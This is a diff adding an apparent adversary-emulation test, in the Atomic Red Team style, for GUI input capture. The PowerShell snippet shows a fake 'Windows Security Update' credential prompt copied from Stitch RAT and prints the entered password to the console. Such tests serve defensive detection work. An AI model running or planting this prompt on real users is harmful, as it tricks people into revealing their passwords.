@@ -1,0 +1,11 @@
+#TechniqueName: Input Capture: GUI Input Capture
+#AtomicTestName: PowerShell - Prompt User for Password
+#Description: Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.&&Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py&
+#Language: ps1
+
+#commands
+# Creates GUI to prompt for password. Expect long pause before prompt is available.    
+$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)
+# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.
+write-warning $cred.GetNetworkCredential().Password
+
